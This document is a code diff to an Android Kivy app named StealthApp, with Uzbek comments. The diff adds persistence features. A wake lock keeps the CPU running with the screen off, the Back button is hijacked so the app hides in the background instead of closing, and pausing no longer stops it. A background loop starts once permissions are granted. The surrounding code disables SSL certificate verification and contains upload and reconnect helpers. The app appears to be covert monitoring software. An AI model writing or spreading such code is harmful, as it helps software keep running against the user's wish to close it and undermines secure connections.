@@ -22,6 +22,7 @@ status           = ["Ishga tushirilmoqda..."]
 should_reconnect = [True]
 ws_ref           = [None]
 app_ref          = [None]
+wake_lock_ref    = [None]   # Ekran o'chanda CPU uxlamasligi uchun
 
 
 def _ssl_ctx():
@@ -30,6 +31,23 @@ def _ssl_ctx():
     ctx.verify_mode    = ssl.CERT_NONE
     return ctx
 
+
+def _acquire_wake_lock():
+    """Ekran o'chanda CPU ni uyquga ketmasligi uchun WakeLock"""
+    try:
+        from jnius import autoclass
+        context      = autoclass('org.kivy.android.PythonActivity').mActivity
+        PowerManager = autoclass('android.os.PowerManager')
+        pm = context.getSystemService(context.POWER_SERVICE)
+        wl = pm.newWakeLock(
+            PowerManager.PARTIAL_WAKE_LOCK,
+            'StealthApp:KeepAlive'
+        )
+        wl.acquire()
+        wake_lock_ref[0] = wl
+        status[0] = 'WakeLock yoqildi. Ekran o\'chsa ham ishlaydi.'
+    except Exception as e:
+        status[0] = 'WakeLock xatolik: ' + str(e)[:80]
 
 # ─── URLLIB YUKLASH ─────────────────────────────────────────────────────────────
 def _multipart(fields, files=None):
@@ -330,6 +348,31 @@ class StealthApp(App):
         Clock.schedule_interval(self.update_ui, 1)
         return layout
 
+    def on_start(self):
+        """Back tugmasini ushlash — yopish o'rniga background ga o'tish"""
+        if platform == 'android':
+            from kivy.core.window import Window
+            Window.bind(on_keyboard=self._handle_keyboard)
+
+    def _handle_keyboard(self, window, key, *args):
+        if key == 27:  # Back tugmasi
+            if platform == 'android':
+                try:
+                    from jnius import autoclass
+                    activity = autoclass('org.kivy.android.PythonActivity').mActivity
+                    activity.moveTaskToBack(True)  # Yopmasdan background ga o'tish
+                    return True
+                except Exception:
+                    pass
+        return False
+
+    def on_pause(self):
+        """Ilova fon rejimiga o'tganda (yopilganda) ham ishlashni davom ettirish"""
+        return True  # True = Android ilovani o'ldirmaydi
+
+    def on_resume(self):
+        pass
+
     def _request_permissions(self, dt):
         try:
             from android.permissions import request_permissions, Permission
@@ -343,6 +386,8 @@ class StealthApp(App):
             threading.Thread(target=run_loop, daemon=True).start()
 
     def _on_permissions_result(self, permissions, grants):
+        # Avval WakeLock, keyin loop
+        Clock.schedule_once(lambda dt: _acquire_wake_lock(), 0.5)
         threading.Thread(target=run_loop, daemon=True).start()
 
     def update_ui(self, dt):
